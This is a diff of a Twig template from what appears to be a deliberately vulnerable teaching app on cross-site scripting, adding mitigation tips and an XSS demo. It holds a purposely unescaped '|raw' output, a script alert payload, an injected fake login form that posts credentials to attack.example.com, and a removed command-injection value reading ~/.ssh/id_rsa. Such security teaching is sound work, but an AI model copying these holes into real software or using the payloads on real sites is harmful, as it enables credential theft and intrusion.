@@ -1,13 +1,19 @@
 {% extends 'cwe/base.html.twig' %}
 {% block solution %}
     <ul>
-        <li>...</li>
+        <li>Never trust data submitted by user. Always validate, sanitize or filter it!</li>
+        <li>
+            Always use HTML entities to display data from your database or submitted by user.
+            If you need to parse HTML content, so be sure to have a white list (and filter) for allowed HTML/JS/CSS content.
+        </li>
+        <li>
+            The input data may be used in a data base search too, so prepare it before using. Do not trust the data
+        </li>
     </ul>
 {% endblock %}
 {% block subcontent %}
 <div class="alert alert-info">
     Cross-site scripting (XSS) vulnerabilities occur when:
-
     <ul>
         <li>Untrusted data enters a web application, typically from a web request.</li>
         <li>The web application dynamically generates a web page that contains this untrusted data.</li>
@@ -17,18 +23,20 @@
         <li>This effectively violates the intention of the web browser's same-origin policy, which states that scripts in one domain should not be able to access resources or run code in a different domain.</li>
     </ul>
 </div>
-{% if command %}
+{% if search %}
     <div class="alert alert-success">
         <ul>
-            <li>Command = {{ command.raw }}</li>
-            <li>Response = {{ command.response }}</li>
+            <li>You searched for <strong>{{ search|raw }}</strong></li>
         </ul>
     </div>
 {% endif %}
-<form method="POST">
+<div class="well">
+    Welcome {{ username|raw ?: 'visitor' }}
+</div>
+<form method="post">
     <div class="row">
         <div class="col-md-6">
-            <input type="text" name="username" value=";cat ~/.ssh/id_rsa" class="form-control">
+            <input type="text" name="query" value="<script>alert('You have been hacked! Cookies could been stolen, redirect to malicious web site, etc.')</script>" class="form-control">
         </div>
         <div class="col-md-6 text-left">
             <input name="submit" type="submit" class="btn btn-danger" value="Unsafe submit"/>
@@ -36,4 +44,11 @@
         </div>
     </div>
 </form>
+<hr/>
+<div class="alert alert-info">
+    The malicious link above could stole your credentials easily.
+</div>
+{% set maliciousLink = '?username=<br/>Please Login:<form name="input" action="http://attack.example.com/stealPassword.php" method="post">Username: <input type="text" name="username" class="form-control"/><br/>Password: <input type="password" name="password" class="form-control" /><input type="submit" value="Login" class="btn btn-success" /></form>' %}
+<a href='{{ maliciousLink }}'>External Malicious link</a> or
+<a href='{{ maliciousLink }}&safe=1'>External Malicious link sanitized</a>
 {% endblock %}
